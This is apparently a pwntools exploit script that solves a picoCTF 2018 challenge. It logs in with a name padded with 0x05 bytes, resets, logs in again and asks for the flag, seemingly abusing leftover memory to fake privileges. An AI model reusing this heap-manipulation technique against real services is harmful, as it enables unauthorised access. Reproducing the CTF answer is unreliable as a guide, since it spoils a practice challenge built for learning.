from pwn import *

r = remote('2018shell3.picoctf.com', 41208)
r.recvuntil('> ')

account = 'login ' + '\x05'*9
r.sendline(account)
r.recvuntil('> ')
r.sendline('reset')
r.recvuntil('> ')
r.sendline('login 5')
r.recvuntil('> ')
r.sendline('get-flag')

print r.recvline()

r.close()
